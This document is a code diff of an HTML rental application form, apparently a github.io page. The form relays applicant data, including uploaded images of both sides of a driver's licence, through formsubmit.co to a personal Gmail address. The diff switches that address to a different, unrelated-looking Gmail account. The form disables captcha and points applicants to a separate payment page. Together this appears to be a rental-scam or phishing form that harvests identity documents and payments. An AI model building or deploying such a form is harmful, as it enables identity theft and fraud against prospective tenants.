@@ -63,7 +63,7 @@
 
   <h1>Rental Application Form</h1>
 
-  <form action="https://formsubmit.co/goodhome267@gmail.com" method="POST" enctype="multipart/form-data">
+  <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
     
     <label>TODAY’S DATE</label>
     <input type="date" name="Today's Date" required>
@@ -163,11 +163,17 @@
     <label>Back</label>
     <input type="file" name="DL Back" accept="image/*,application/pdf" required>
 
+     <label>Signature</label>
+    <input type="text" name="Signature" required>
+
+    <label>Date Signed</label>
+    <input type="date" name="Date Signed" required>
+
     <h2>Payment Method</h2>
-    <label><input type="checkbox" name="Payment Method[]" value="Zelle"> Zelle</label>
-    <label><input type="checkbox" name="Payment Method[]" value="Paypal"> Paypal</label>
-    <label><input type="checkbox" name="Payment Method[]" value="Venmo"> Venmo</label>
-    <label><input type="checkbox" name="Payment Method[]" value="Credit/Debit"> Credit/Debit Card (via link below)</label>
+    <label>Zelle</label>
+    <label>Paypal</label>
+    <label>Venmo</label>
+    <label>Credit/Debit Card (via link below)</label>
 
     <p>Click below if you want to pay via Credit or Debit Card:</p>
     <a href="payment-choice.html" class="payment-link">👉 Choose Payment Method</a>
@@ -176,12 +182,6 @@
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_template" value="table">
     <input type="hidden" name="_next" value="https://goodhomesrentals.github.io/rentalapplication/thank-you.html">
-
-    <label>Signature</label>
-    <input type="text" name="Signature" required>
-
-    <label>Date Signed</label>
-    <input type="date" name="Date Signed" required>
 
     <button type="submit">Submit Application</button>
   </form>
